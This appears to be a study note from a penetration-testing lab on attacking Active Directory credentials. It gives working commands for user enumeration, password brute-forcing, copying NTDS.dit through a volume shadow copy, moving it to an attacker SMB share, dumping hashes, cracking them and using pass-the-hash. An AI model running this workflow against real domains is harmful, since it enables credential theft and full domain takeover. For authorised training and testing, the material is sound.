## Overview

In Active Directory environments, authentication is no longer limited to the local SAM database.

Once a Windows host is joined to a domain:

- domain logon requests are validated by the **domain controller**
- local accounts may still be used with `HOSTNAME\user` or `.\user`
- domain accounts are authenticated against Active Directory

This makes domain controllers extremely high-value targets.

One of the most important files on a domain controller is:

```text
%SystemRoot%\NTDS\NTDS.dit
```

This is the Active Directory database and may contain:

- domain usernames
- NT password hashes
- service account hashes
- machine account hashes
- `krbtgt` hash
- directory schema data

If extracted successfully, this can lead to **full domain compromise**.

---

# Why This Matters

Attacking Active Directory credentials can lead to:

- domain user credential recovery
- lateral movement
- privilege escalation
- service account compromise
- recovery of `krbtgt`
- pass-the-hash opportunities
- total domain takeover

---

# Domain vs Local Authentication

On a domain-joined system:

- **domain users** authenticate through the DC
- **local users** can still authenticate against the local SAM

Examples:

## Domain account
```text
INLANEFREIGHT\bwilliamson
```

## Local account
```text
WS01\bob
```

or:

```text
.\bob
```

This distinction matters during attacks, especially when deciding whether:

- local hashes are useful
- domain auth is being tested
- remote login targets are validating against AD or local SAM

# Usernames Matter

Before attacking passwords, it is often worth identifying valid usernames.

Organizations commonly use predictable naming conventions.

Examples for `Jane Jill Doe`:

| Convention | Example |
|-----------|---------|
| firstinitiallastname | `jdoe` |
| firstinitialmiddleinitiallastname | `jjdoe` |
| firstnamelastname | `janedoe` |
| firstname.lastname | `jane.doe` |
| lastname.firstname | `doe.jane` |
| nickname | `doedoehacksstuff` |

Email addresses can often reveal the username format:

```text
jdoe@company.com → jdoe
```

# Enumerating Valid Usernames with Kerbrute

Before guessing passwords, it is often smart to confirm which usernames are valid.

Useful tool:

```bash
kerbrute
```

Example:

```bash
./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt
```

Example result:

```text
[+] VALID USERNAME: bwilliamson@inlanefreight.local
```

Why this helps:

- reduces wasted password attempts
- avoids unnecessary noise
- helps identify naming convention
- improves spray / brute-force efficiency

# Brute Forcing Domain Accounts with NetExec

Once a valid username is known, credentials can be tested directly against the DC.

Example:

```bash
netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

Possible success output:

```text
[+] inlanefreight.local\bwilliamson:P@55w0rd!
```

Important:

This can trigger:

- lockouts
- security logs
- alerting

Be mindful of account lockout policy before attempting this.

# Event Logs / Detection Considerations

Windows logs these events in:

```text
Event Viewer → Security
```

This is useful to remember for reporting because successful or failed login attempts often leave clear evidence behind.

# Goal: Obtain NTDS.dit

If valid privileged credentials are recovered, the next high-value objective is:

```text
NTDS.dit
```

Location on DC:

```text
%SystemRoot%\NTDS\NTDS.dit
```

This is the Active Directory database.

To decrypt the hashes successfully, you also need:

```text
SYSTEM
```

because the bootkey is required, just like with local SAM extraction.

---

# Accessing the Domain Controller

If credentials work for WinRM:

```bash
evil-winrm -i 10.129.201.57 -u bwilliamson -p 'P@55w0rd!'
```

This provides a PowerShell session on the DC.

# Checking Privileges

## Local group membership

```powershell
net localgroup
```

Look for groups like:

- Administrators
- Backup Operators
- Account Operators
- Server Operators
- Remote Management Users

---

## User account privileges

```powershell
net user bwilliamson
```

Example high-value result:

```text
Global Group memberships     *Domain Users         *Domain Admins
```

If the account is in:

- Domain Admins
- Administrators
- equivalent privileged groups

then extracting NTDS is likely possible.

---

# Capturing NTDS.dit with Volume Shadow Copy

Because `NTDS.dit` is in use by the system, a common approach is to use **VSS** (Volume Shadow Copy Service).

## Create shadow copy

```powershell
vssadmin CREATE SHADOW /For=C:
```

Example output:

```text
Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

---

## Copy NTDS.dit from shadow copy

```powershell
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
```

This copies the database to a normal path so it can be exfiltrated.

---

# Transfer NTDS.dit to Attack Host

As with hive dumping, you can use an SMB share hosted from the attacker.

Example:

```powershell
cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
```

Important:

You also need the `SYSTEM` hive from the DC.

---

# Dumping Hashes from NTDS.dit

Once you have:

- `NTDS.dit`
- `SYSTEM`

you can extract hashes offline.

## Using secretsdump

```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

Example output:

```text
Administrator:500:LMHASH:NTHASH:::
krbtgt:502:LMHASH:NTHASH:::
DC01$:1000:LMHASH:NTHASH:::
```

This can expose:

- domain admin hashes
- machine account hashes
- service account hashes
- `krbtgt` hash

---

# Faster Method with NetExec

NetExec can automate NTDS dumping with:

```bash
netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
```

This can be much faster than manually:

- creating VSS
- copying file
- transferring it

Still, understanding the manual process is important.

---

# Cracking Extracted NT Hashes

Hashcat mode for NT hashes:

```text
-m 1000
```

Example:

```bash
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

Example result:

```text
64f12cddaa88057e06a81b54e73b949b:Password1
```

Recovered passwords may then be used for:

- WinRM
- SMB
- RDP
- SSH
- additional domain accounts
- service logons

---

# If Cracking Fails: Pass-the-Hash

A cracked password is not always necessary.

NT hashes can often still be used directly via **Pass-the-Hash (PtH)**.

Instead of:

```text
username:password
```

you use:

```text
username:nthash
```

Example with Evil-WinRM:

```bash
evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```

This is very useful for:

- lateral movement
- remote admin access
- continued operation without plaintext password

# High-Value Hashes in NTDS.dit

Particularly important accounts:

| Account | Why It Matters |
|--------|----------------|
| Administrator | direct domain admin access |
| krbtgt | golden ticket risk |
| DC01$ / machine accounts | domain operations / trust material |
| service accounts | often privileged and reused |
| backup / management accounts | broad access |

# Typical Workflow

## Username/Password Attack Path

1. gather employee names
2. build username list
3. validate usernames with Kerbrute
4. brute force / spray with NetExec
5. obtain privileged credential
6. access DC
7. extract `NTDS.dit` + `SYSTEM`
8. dump hashes
9. crack or PtH

## Direct Privileged Access Path

1. obtain DA/local admin on DC
2. use `vssadmin`
3. copy `NTDS.dit`
4. exfiltrate files
5. run `secretsdump`
6. crack or reuse hashes

---

# Key Takeaways

- Active Directory authentication moves trust to the domain controller
- valid domain usernames are worth confirming before password attacks
- `NTDS.dit` is the most important credential store on a DC
- `SYSTEM` is required to decrypt the hashes from `NTDS.dit`
- VSS is a standard way to copy locked files like `NTDS.dit`
- `secretsdump` is the main offline extraction tool
- if cracking fails, NT hashes may still be usable via Pass-the-Hash
